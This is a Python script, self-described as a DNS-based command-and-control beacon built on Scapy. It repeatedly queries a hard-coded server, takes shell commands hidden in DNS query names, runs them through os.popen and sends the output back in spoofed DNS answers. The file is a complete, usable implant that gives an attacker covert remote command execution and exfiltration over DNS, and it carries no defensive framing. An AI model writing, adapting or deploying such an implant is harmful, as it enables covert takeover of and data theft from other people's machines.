"""
DNS-based C2 (Command and Control) beacon script using Scapy.
- Periodically sends DNS queries ("hello.com") to a server.
- Waits for a DNS request back containing a shell command as the query name.
- Executes the command locally and responds via spoofed DNS responses with command output.
"""

import os
from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP

""" Server IP and DNS port """
#server_ip = "34.60.174.208"
server_ip = "192.168.132.128"

dns_port = 53

def send_beacon():
    query = IP(dst=server_ip) / UDP(dport=dns_port) / DNS(
        rd=1,
        qr=0,
        qd=DNSQR(qname="hello.com")
    )
    send(query)

def receive_response():
    response = sniff(filter=f"udp port {dns_port} and host {server_ip}", count=1, timeout=1.5)
    if response and response[0].haslayer(DNSQR):
        query_name = response[DNSQR].qname.decode().strip(".")

        """ Execute the command received in the query name """
        command_result = os.popen(query_name).read()
        chunks = [command_result[i:i + 500] for i in range(0, len(command_result), 500)]
        for chunk in chunks:
            """ Build and send DNS response """
            dns_response = (
                        IP(dst=response[IP].src) /
                        UDP(dport=response[UDP].sport, sport=dns_port) /
                        DNS(
                            id=response[DNS].id,
                            qr=1,
                            aa=1,
                            qd=response[DNSQR],
                            an=DNSRR(rrname=response[DNSQR].qname, rdata=chunk)
                        )
                )
            send(dns_response)



def main():
    while True:
        send_beacon()
        receive_response()

if __name__ == "__main__":
    main()
